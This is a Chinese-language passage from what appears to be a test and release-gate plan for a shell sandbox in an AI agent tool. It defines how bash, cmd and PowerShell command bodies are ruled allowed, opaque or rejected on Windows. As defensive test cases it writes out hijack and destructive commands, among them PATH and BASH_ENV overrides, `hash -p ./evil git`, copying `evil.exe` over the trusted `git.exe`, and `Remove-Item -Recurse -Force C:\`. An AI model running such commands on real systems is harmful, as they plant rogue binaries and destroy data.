**bash 用例：** `PATH=/x git`、`export PATH=…; git`、`BASH_ENV=./p bash -c …`、`alias rm=…; rm`、
`. ./f; rm`（**不透明**）；**`printf -v PATH /x; git`、`read PATH <<< /x; git` 与
`hash -p ./evil git; git`（**不透明** —— §3.15 实测的三种）；未识别的内建命令后跟 `git`
（**不透明**）**；经过滤 PATH 解析到的裸 `git`（**放行**）；不在过滤 PATH 上的裸 `evil`
（**不透明**）；以及**在**过滤 PATH 上、但不在 POSIX 表里的裸 `evil`（**不透明** —— 有映像没名字，
D5 5a）。**并且断言 rung 真的键住了什么：** 上面每一条裁定都是在 `rung` 为 `git_bash` 的 spec 下取
的，而同样这些 body 在 `system_posix` 下产出**今天**的裁定 —— 成对，因为一条无法被选择所区分的政
策，与一条永远开着的政策不可分辨，而 §9 q4 之所以开着，正是为了让它可分辨（D2）。

### G08

不透明经 `NullTransport` 与 PowerShell 子代理都被拒绝。

### G09

三个桶的降级率，在 PR-7 之前经接受。`uv run ruff check .` 绿。

### G10

逐级的 Windows 矩阵。

### G11

**两种 `allow_git_bash` 状态下**都钉住阶梯顺序：关着时阶梯止于 `cmd`；开着且 Git Bash 在场时选 Git Bash、排在 `cmd` 之前，不在场时回退 `cmd` —— 于是开关是在生产环境真正走的那条路径上被测的（D4、D6）。

### G12

`settings.json` / 项目文件里的 `shell` 按 D6。

### G13

快照抵达每个 root。（后半「子代理按身份持父级引擎」是子代理计划的 G13b。）

### G14

缺 provider / 冲突被拒。

### G15

不解析工作树二进制。

### G16

按来源整体优先。

### G18

在 Windows job 上：`NoDefaultCurrentDirectoryInExePath=1`；哨兵 body 逐字节一致；子进程 `PATH` 与
`PATHEXT` 如钉，**且机器 PATH 上一个用户可写的目录不出现在子进程的 PATH 里**（D4）；
`git.cmd` vs `git.exe` 跑 `.exe`；含空格的 cmd 路径按该解释器调用。

### G20

**Windows job 上的 Git Bash：** 父环境中 `BASH_ENV` 指向工作树文件时，子进程只跑 body；导出
`BASH_FUNC_git%%` 时裸 `git` 是 `/usr/bin/git` 而不是那个函数（§3.16），**并且往下两层进程同样
断言**：一条可信命令自己再跑 `/bin/sh -c` 时，那个环境里看不到任何 `BASH_FUNC_*` —— 这一条 `-p`
单独给不了，只有清除环境才给得了（D4）；`/c/Users` 形与
`C:\Users` 形的参数在 `MSYS_NO_PATHCONV=1` 下原样抵达 body；裸 `git` 跑可信的 `git.exe`；工作树
里的 `evil.sh` 不被裸 `evil` 执行。**并且它实测 5h 留空的那一条：** 一个可信目录里无扩展名的
`git` 脚本与 `git.exe` 并存时，裸 `git` 跑的是哪一个 —— 答案在该级上线前写进 5h。红 ⇒ PR-7 关着
这一级发布。

### G21

**Windows job 上的 PowerShell edition 矩阵：** 同一段脚本在 `powershell.exe` 与 `pwsh` 下各用
自己实测的表；一个在一个 edition 里是别名、在另一个里不存在的裸词在两边判定不同，而记录身份两张
表都不匹配的解释器判**不透明**。**自动加载，从子进程内部量、并且对抗性地量：** 把一个导出名为
`git` 的函数的模块放进 **CurrentUser 模块目录、位于工作树之外** —— 正是「没有工作树路径」那条
断言会放过、而这一条不放过的情形 —— 子进程报告 `$PSModuleAutoLoadingPreference` 与裸 `git` 解析
到了什么，它必须解析到可信的 `git.exe`，绝不能是那个模块。前奏被断言不扰动 body：一段第一条语句
有可观察副作用的 body，在前奏之后仍产生同样的副作用。**任一作用域的 `powershell.config.json`
选择了非默认会话配置时，该级连一次都不启动解释器就拒绝** —— 断言方式是给那份配置一个会写下哨兵
文件的启动脚本，并要求该文件不存在；一个「问解释器它的配置是什么」的设计，为了问出来就已经把那个
脚本跑了。预检无法确立封闭环境的地方，地板把每个 PowerShell 裸词都当作不透明，门槛断言的是这次
降级，而不是一次失败。**并且断言前奏那道守卫是中止而不只是上报：** 当会话配置把该偏好改回去时，
一段第一条语句带可观察副作用的 body 产生**零**副作用，启动以非零码退出 —— 只查成功路径与降级
裁定的门槛，永远不会去跑那段「必须跑不起来」的 body。**TOCTOU 两个方向都测：** 在预检之后、启动
之前改掉配置，以及另测把解析路径底下的解释器换掉 —— 守卫的身份校验失败、非零退出，body 的副作用
一次都没发生。**门槛 21 里有两项是刻画性探针，不是发布门槛，这个区别现在写明了。** 发布门槛判红就
挡住翻转；刻画性探针记录的是 §7 已经声明过的残留的实测行为，它的预期结果写在探针里。两个探针：
(a) 预检之后装上的配置 —— **启动哨兵预期存在**，因为那段脚本跑在前奏之前，断言的是 *body* 的副作
用不发生；(b) 把解释器换成记录字段与记录哈希全都对上的那一个 —— 预期**测不出来**。两者都是
`xfail` 式、写明预期，于是任一方向的变化都会让套件失败。门槛 21 的其余各项都是发布门槛。**套件里
没有「允许判红的门槛」这个类别** —— 一道可以判红的门槛，什么都门不住。

### G23

**解释器的发现与身份，宿主侧（D4）：** 一个被丢进「恰好在机器 PATH 上的用户可写目录」的
`pwsh.exe`，**永远不被自动选中** —— 那个目录也过不了过滤器（D4）；断言的是它没有被*启动*：给这个
植入的二进制一段会写下哨兵文件的 body，并要求该文件不存在；同一个二进制经 `shell.path` 显式点名
时**会**被选中，这正是两档的区别所在，而不是自相矛盾；位于某个已知安装位置里、但没有签名的映像被
拒；而一个自身目录**不是** `$PSHOME` 的 launcher —— shim、符号链接或一份拷贝 —— 它的 AllUsers
`powershell.config.json` 从宿主侧解析出的安装根读，或在该安装根解析不出来时拒绝该级，绝不从
launcher 所在目录读（§3.20）。**而正例就写在这里，不再是从门槛 4 指过来：** 一个落在「该 agent 的
主体写不了」的根下、且在可信表里有条目的 `git.exe` 判**放行** —— 对着子进程的 token 做真实的 ACL
检查，且**既不带签名、也不在 allowlist 里**，于是这道门槛没法靠「把两者之一当作准入条件」蒙混过去
（D5 5a）。

### G24

**嵌套启动与非本机执行器（D5 规则 2、D2）：** body 里的 `pwsh -NoProfile -Command "git status"`
判**不透明**，尽管那段嵌套 body 单独看每个字节都放行；而 `pwsh -Command "Remove-Item -Recurse
-Force C:\"` 是在重新进入的那段 body 里被**危险表命中**（§3.6）拒掉 —— 于是两者靠理由区分，而不
只是靠裁定；`cmd /c git status` 与
`bash -c 'git status'` 同理。以及：`filesystem_is_local` 为假、执行器又没提供 oracle 的 spec，让
每一个需要映像的命令词都不透明 —— 一个整个省掉该字段的 spec 同理，因为缺席即 `false` —— 而同一段
body 在本机 spec 下保持它原来的裁定。**提供了 oracle 之后，裁定跟着目标走、不跟着地板走：** 一个在
目标 PATH 上解析得到、在地板 PATH 上解析不到的裸词判**放行**，反过来那个判**不透明**，而
`Start-Job { … }` 在两边都不透明（规则 7）。一次读错文件系统的检查，是因为错的理由才通过的（D2）。

### G25

**提权态有裁定（D4）：** agentao 以 Windows 管理员身份、或容器里的 `root` 运行时，每一个候选根都
对执行主体可写，于是可信集为**空**、该级被**拒绝** —— 用那条让它要紧的序列来断言：
`Copy-Item .\evil.exe 'C:\Program Files\Git\cmd\git.exe'; git status`，它在任何一步都不得走到
「放行」。**非特权时，同一段 body 是*被放行*的** —— 地板没有可拒之处，因为往文件系统路径
`Copy-Item` 是惰性的、`git` 两半都过 —— **而那次拷贝会在 OS 层失败**，于是跑起来的是那个可信的
`git`。这一对才是门槛：同一段文本，两种姿态下各一个裁定，因为一个从不改变答案的谓词，等于没有被
求值。**走空的阶梯也一并断言：** 每一级都被拒绝时，一次 shell 调用返回
`hardline:no-trusted-rung-opaque`，而工具仍然注册着 —— 不是消失，也不是退回 `%COMSPEC% /c`
（D4、D6）。

### G26

**规则 7 的那些包装器，逐个理由各一格（D5 规则 7）：** `Start-Process git` 判**不透明**，理由是
ShellExecute 不是 5g 的解析器；`Start-Process -UseNewEnvironment git` 不透明，**且断言在环境这条
理由上**，因为光这一个开关就能在被放行的 body 里把过滤前的用户 `PATH` 装回来；
`Start-Process -Verb RunAs git` 在主体这条理由上；`Invoke-Item .\x` 与 cmd `start x` 在文件关联
这条理由上；`Invoke-Command -ComputerName a { git status }` 与 `git status &` 作为「另起进程」的
启动。**`&` 那一行同时记下本计划没能核实的东西：** 钉住的 tree-sitter 语法给尾置作业运算符什么
节点 kind，这里没测过，所以那一行只断言它被拒、发生在第 5 步或第 8 步，并写明是哪一步 —— 一个
*理由*未知的用例，它的裁定仍然是钉住的。